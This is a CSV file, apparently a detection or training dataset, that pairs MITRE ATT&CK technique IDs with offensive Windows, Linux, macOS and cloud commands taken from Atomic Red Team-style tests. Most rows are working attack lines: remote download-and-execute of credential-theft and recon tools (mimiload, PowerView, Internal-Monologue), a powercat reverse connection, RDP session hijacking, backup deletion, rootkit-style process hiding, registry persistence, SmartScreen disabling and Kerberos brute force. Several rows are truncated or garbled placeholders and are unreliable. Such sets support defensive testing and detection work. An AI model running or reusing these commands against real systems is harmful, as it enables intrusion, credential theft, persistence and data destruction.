mitre_id,command
T1546,"$input_table = ""#{parent_list}"".split("","") $name = ""debugger"" $value = ""#{attached_process}"" foreach ($item in $input_table){ $item = $item.trim() $registrypath = ""hklm:\software\microsoft\windows nt\currentversion\image file execution options\$item"" if(!(test-path $registrypath)) { new-item -path $registrypath -force new-itemproperty -path $registrypath -name $name -value $value -propertytype string -force } else { new-itemproperty -path $registrypath -name $name -value $value } }"
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_641 write-host ""end of federation configuration."""
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_258"""
T1074,"invoke-webrequest  ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.bat""  -outfile  var_700"
T1518,"get-netfirewallprofile | format-table name, enabled get-netfirewallsetting get-netfirewallrule | select displayname, enabled, description"
T1014,"echo var_239 | tee -a \etc\ld.so.preload \usr\local\bin\evil_script.py localhost -c 10 >\dev\null & pgrep -l evil_script.py || echo ""process hidden"""
T1069,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\master\recon\powerview.ps1' -usebasicparsing); get-domaingroup -verbose
T1546,"reg add ""hkcu\software\microsoft\office\16.0\word\options"" /v startup-path /t reg_sz /d ""c:\users\%username%\appdata\roaming\microsoft\windows\recent"" /f"
T1562,"set-powercliconfiguration -invalidcertificateaction ignore -participateinceip:$false -confirm:$false connect-viserver -server #{vm_host} -user #{vm_user} -password #{vm_pass} (get-esxcli -vmhost #{vm_host} -v2).software.acceptance.set.invoke(@{level = ""communitysupported""}) disconnect-viserver -confirm:$false"
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\namedpipe\namedpipesystem.ps1')
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_426"" net start sesshijack"
T1047,powershell -exec bypass -e sqbuahyabwbragualqbxag0aaqbnaguadaboag8azaagac0auabhahqaaaagahcaaqbuadmamgbfahaacgbvagmazqbzahmaiaatae4ayqbtaguaiabjahiazqbhahqazqagac0aqqbyagcadqbtaguabgb0aewaaqbzahqaiabuag8adablahaayqbkac4azqb4agua
T1113,"add-type -assemblyname system.windows.forms $screen = [windows.forms.systeminformation]::virtualscreen $bitmap = new-object drawing.bitmap $screen.width, $screen.height $graphic = [drawing.graphics]::fromimage($bitmap) $graphic.copyfromscreen($screen.left, $screen.top, 0, 0, $bitmap.size) $bitmap.save(""var_327"")"
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_857""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1048,"import-module ""var_767"
T1021,"cmd.exe /c ""net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"""
T1221,"start  ""var_918"""
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_323"""
T1614,var_280
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1204.002\src\chromeexec-macrocode.txt"" -officeproduct ""word"" -sub ""execchrome"""
T1550,var_800
T1615,"powershell -nop -exec bypass -c ""iex (new-object net.webclient).downloadstring('https:\\github.com\bc-security\empire\blob\86921fbbf4945441e2f9d9e7712c5a6e96eed0f3\empire\server\data\module_source\situational_awareness\network\powerview.ps1'); get-domaingpo"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_577"" net start sesshijack"
T1110,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe bruteuser --dc var_525 $env:temp\bruteuser.txt testuser1"
T1546,"copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\t1546.011compatdatabase.sdb copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\custom64\t1546.011compatdatabase.sdb"
T1574,ld_preload=var_337 ls
T1037,sudo  cp  var_756  \tmp\t1037_005_agent.plist  \library\startupitems\atomic.sh  start
T1187,rpcping -s var_633 \a connect \u ntlm 1>$null
T1570,net use * 'var_233' '*:\'
T1221,"start ""var_872"""
T1137,"# registry setting to ""trust access to the vba project object model"" in word $registrykey = ""hkcu:software\microsoft\office\16.0\word\security"" $registryvalue = ""accessvbom"" $registrydata = ""1"" # the path where a flag text file will be created if registry setting did not already exist or if it was set to 0 $flagpath1 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag1.txt"" $flagpath2 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag2.txt"" # get the value of the key\value pair $value = (get-itemproperty -path $registrykey -name $registryvalue -erroraction silentlycontinue).$registryvalue # logical operation to: if the value of the key\value is 1, do nothing - # if the value is 0, change it to 1 and create flag1 - # if it doesn't exist, create the value and flag2 if ($value -eq ""1"") { write-host ""the registry value '$registryvalue' already exists with the required setting."" } elseif ($value -eq ""0"") { write-host ""the registry value was set to 0, temporarily changing to 1."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag1"" > $flagpath1 } else { write-host ""the registry value '$registryvalue' does not exist, temporarily creating it."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag2"" > $flagpath2 } add-type -assemblyname microsoft.office.interop.word # define the path of copied normal template for restoral $copypath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal1.dotm"" # define the path to the normal template $docpath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal.dotm"" # create copy of orginal template for restoral copy-item -path $docpath -destination $copypath -force # vba code to be insterted as a macro # will create a scheduled task to open the calculator at 8:04pm daily $vbacode = @"" sub autoexec() dim applicationpath as string dim taskname as string dim runtime as string dim schtaskscmd as string applicationpath = ""%systemroot%\system32\calc.exe"" taskname = ""opencalctask"" runtime = ""20:04"" schtaskscmd = ""schtasks \create \tn """""" & taskname & """""" \tr """""" & applicationpath & """""" \sc daily \st "" & runtime & "" \f"" shell ""cmd.exe \c "" & schtaskscmd, vbnormalfocus end sub ""@ # create a new instance of word.application $word = new-object -comobject word.application # keep the word application hidden $word.visible = $false # open the document $document = $word.documents.open($docpath) # access the vba project of the document $vbaproject = $document.vbproject # add a new module to the vba project $newmodule = $vbaproject.vbcomponents.add(1) # 1 = vbext_ct_stdmodule # add the vba code to the new module $newmodule.codemodule.addfromstring($vbacode) # run the macro $word.run(""autoexec"") # save and close the document $document.saveas($docpath) $document.close() # quit word $word.quit() # release com objects [system.runtime.interopservices.marshal]::releasecomobject($document) | out-null [system.runtime.interopservices.marshal]::releasecomobject($word) | out-null [system.runtime.interopservices.marshal]::releasecomobject($vbaproject) | out-null [system.runtime.interopservices.marshal]::releasecomobject($newmodule) | out-null"
T1071,var_208
T1057,"start-process -filepath ""$env:programfiles\process hacker 2\var_162"""
T1609,"docker build -t t1609 $pathtoatomicsfolder\t1609\src\ docker run --name t1609_container --rm -itd t1609 bash \tmp\script.sh docker exec -i t1609_container bash -c ""cat \tmp\output.txt"""
T1490,wbadmin  delete  systemstatebackup  -keepversions:0
T1046,docker build -t t1046 $pathtoatomicsfolder\t1046\src\ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container \scan.sh
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_849"
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_765"""
T1547,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "" var_875""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit"" -value ""$newvalue"""
T1187,"& ""var_902 write-host ""end of petitpotam attack"""
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1491,"echo """" | ""var_397"" ""esxcli system welcomemsg set -m 'ransomware-notification'"""
T1484,"new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimedc -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimeoffsetdc -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtime -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimeoffset -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name enablesmartscreen -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name shellsmartscreenlevel -force"
T1020,"$filename = ""var_786"
T1140,"mkdir ""var_485"" -f:* . popd"
T1053,"$xml  =  [system.io.file]::readalltext(""var_995"
T1105,sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
T1127,"copy  ""var_526  %temp%\hello.js"
T1553,"$cert = import-certificate -filepath var_515 -certstorelocation cert:\localmachine\my move-item -path $cert.pspath -destination ""cert:\localmachine\root"""
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1106,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe \out:""var_157"" %tmp%\t1106.exe"
T1218,"rundll32.exe shell32.dll,control_rundll ""#{input_file}"""
T1053,"schtasks /create /tn ""t1053_005_onlogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" schtasks /create /tn ""t1053_005_onstartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe"""
T1187,"iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-internalmonologue.ps1')  invoke-internalmonologue  -command  ""-downgrade  true  -impersonate  true  -restore  true"""
T1543,sudo cp var_356
T1137,"reg add ""hkey_current_user\software\microsoft\office\16.0\outlook\security"" \v level \t reg_dword \d 1 \f mkdir %appdata%\microsoft\outlook\ >nul 2>&1 echo ""atomic red team test"" > %appdata%\microsoft\outlook\vbaproject.otm"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1136,"az  login  $userprincipalname  =  ""var_576""  az  ad  user  create  --display-name  $username  --password  $password  --user-principal-name  $userprincipalname  az  ad  user  list  --filter  ""displayname  eq  'atomicredteam'"""
T1547,"$oldvalue = $(get-itemproperty hklm:\system\currentcontrolset\control\lsa\osconfig -name 'security packages' | select-object -expandproperty 'security packages'); set-itemproperty -path ""hklm:\system\currentcontrolset\control\lsa\osconfig"" -name 'security packages old' -value ""$oldvalue""; $newvalue = ""atomictest.dll""; set-itemproperty hklm:\system\currentcontrolset\control\lsa\osconfig -name 'security packages' -value $newvalue"
T1078,pw useradd art -g wheel -s \bin\sh echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 pw lock art pw usermod art -e +1d pw unlock art pw user mod art -e +99d su art whoami exit
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_608"" net start sesshijack"
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\besimorhino\powercat\ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5\powercat.ps1') powercat -c var_188
T1619,"az  login  #  login  to  azure  #  get  all  storage  accounts  in  the  subscription  $storageaccounts  =  az  storage  account  list  --query  ""[].{name:name,  resourcegroup:resourcegroup}""  --output  json  |  convertfrom-json  $storageaccountobjects  =  @()  $downloadedfunctionfiles  =  @()  foreach  ($account  in  $storageaccounts)  {  write-output  ""`nfound  storage  account  $($account.name)""  $storageaccountobjects  +=  [pscustomobject]@{  resourcegroup  =  $account.resourcegroup  storageaccountname  =  $account.name  filesharename  =  """"  containername  =  """"  blobname  =  """"  tablename  =  """"  queuename  =  """"  }  $allowsharedkeyaccess  =  az  storage  account  show  --name  $account.name  --resource-group  $account.resourcegroup  --query  ""allowsharedkeyaccess""  if  ($allowsharedkeyaccess  -eq  ""false"")  {  #  $allowsharedkeyaccess  could  be  true  or  null  write-output  ""shared  key  access  is  disabled  for  this  storage  account.""  }  else  {  $connectionstring  =  az  storage  account  show-connection-string  --name  $account.name  --resource-group  $account.resourcegroup  --query  connectionstring  --output  tsv  $fileshares  =  az  storage  share  list  --connection-string  $connectionstring  --query  ""[].name""  --output  json  |  convertfrom-json  foreach($fileshare  in  $fileshares)  {  write-output  ""found  file  share:  $($fileshare)""  $storageaccountobjects  +=  [pscustomobject]@{  resourcegroup  =  $account.resourcegroup  storageaccountname  =  $account.name  filesharename  =  $fileshare  containername  =  """"  blobname  =  """"  tablename  =  """"  queuename  =  """"  }  }  $containers  =  az  storage  container  list  --connection-string  $connectionstring  --query  ""[].name""  --output  json  |  convertfrom-json  foreach($container  in  $containers)  {  write-output  ""found  container:  $($container)""  $storageaccountobjects  +=  [pscustomobject]@{  resourcegroup  =  $account.resourcegroup  storageaccountname  =  $account.name  filesharename  =  """"  containername  =  $container  blobname  =  """"  tablename  =  """"  queuename  =  """"  }  $blobs  =  az  storage  blob  list  --connection-string  $connectionstring  --container-name  $container  --query  ""[].name""  --output  json  |  convertfrom-json  foreach($blob  in  $blobs)  {  write-output  ""found  blob:  $($blob)""  $storageaccountobjects  +=  [pscustomobject]@{  resourcegroup  =  $account.resourcegroup  storageaccountname  =  $account.name  filesharename  =  """"  containername  =  $container  blobname  =  $blob  tablename  =  """"  queuename  =  """"  }  }  }  $tables  =  az  storage  table  list  --connection-string  $connectionstring  --query  ""[].name""  --output  json  |  convertfrom-json  foreach($table  in  $tables)  {  write-output  ""found  table:  $($table)""  $storageaccountobjects  +=  [pscustomobject]@{  resourcegroup  =  $account.resourcegroup  storageaccountname  =  $account.name  filesharename  =  """"  containername  =  """"  blobname  =  """"  tablename  =  $table  queuename  =  """"  }  }  $queues  =  az  storage  queue  list  --connection-string  $connectionstring  --query  ""[].name""  --output  json  |  convertfrom-json  foreach($queue  in  $queues)  {  write-output  ""found  table:  $($table)""  $storageaccountobjects  +=  [pscustomobject]@{  resourcegroup  =  $account.resourcegroup  storageaccountname  =  $account.name  filesharename  =  """"  containername  =  """"  blobname  =  """"  tablename  =  """"  queuename  =  $queue  }  }  }  }  #  store  file  lists  to  csv  file  $storageaccountobjects  |  export-csv  -path  ""var_750""  #  print  lists  that  have  been  stored  as  csv  file  $storageaccountobjects  |  format-table  -property  resourcegroup,  storageaccountname,  filesharename,  containername,  blobname,  tablename,  queuename  -autosize  -wrap"
